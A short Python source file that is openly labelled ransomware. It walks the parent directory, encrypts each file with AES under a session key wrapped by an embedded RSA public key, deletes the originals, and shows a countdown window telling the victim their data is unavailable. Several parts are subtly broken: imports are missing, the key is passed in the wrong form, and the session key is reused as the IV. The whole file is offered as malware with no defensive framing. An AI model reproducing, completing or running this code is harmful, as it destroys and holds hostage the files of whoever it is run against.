import os
from pathlib import Path
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import tkinter as tk

# Public key in PEM format
pubkey = '''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4AqSFnPjiZ8tk3/7Acws8nZW7RrYy5woVW70lw9NJWy+VY3BdMukH44RMfSaigN5rJ2BN8Uksouc+ZWCtH2IGm6EhtBn6LHv8zAKpPCwGkECq2KnRhWqZkgvNM1iZAf2nB4NLtketbeRMWXXHoT8BFhZSduqVIqpw0pM9f4Ns1Ggl+gcNz6LfgL5nJdM2onPXVmBBwaHhQx2vmfvyaN0aBzW1szLREV4dywF9i7N8bjVCCorKBhhbyaFnLKfaU0F0KLQ3bRbVeqYmgb/DXyHaO5svjLudwaTuxuGrHlUJsNyffKWVoitbBu+St8tytWkKrmTJOIfAb7Ro0vK+tHgawIDAQAB'''

# Function for directory scan
def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


# Function for encryption
def encrypt(dataFile, publicKey):
    # Read data from file
    extention = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, "rb") as f:
        data = f.read()

    # Convert data to bytes
    data = bytes(data)

    # Create RSA public key
    public_key = serialization.load_pem_public_key(publicKey, backend=default_backend())
    sessionKey = os.urandom(16)

    # Encrypting session key with public key
    encryptedSessionKey = public_key.encrypt(
        sessionKey,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    # Encrypt data with session key
    cipher = Cipher(algorithms.AES(sessionKey), modes.CFB(sessionKey))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()

    # Save the encrypted data to file
    fileName = dataFile.split(extention)[0]
    fileExtention = ".skillissue"
    encryptedFile = fileName + fileExtention
    with open(encryptedFile, "wb") as f:
        [f.write(x) for x in (encryptedSessionKey, ciphertext)]
    os.remove(dataFile)


def countdown(count):
    hour, minute, second = count.split(":")
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label["text"] = "{}:{}:{}".format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, "{}:{}:{}".format(hour, minute, second))


root = tk.Tk()
root.title("Skill issue ransomware")
root.geometry("500x300")
root.resizable(True, True)

label1 = tk.Label(root, text="Your data is unavailable for 5 minutes")
label1.pack()
label = tk.Label(root, font=("calibri", 50, "bold"), fg="white", bg="red")
label.pack()

countdown("00:05:00")

directory = "../"
excludeExtension = [".py", ".pem", ".exe"]
for item in scanRecurse(directory):
    filePath = Path(item)
    fileType = filePath.suffix.lower()
    if fileType in excludeExtension:
        continue
    encrypt(filePath, pubkey)

root.mainloop()
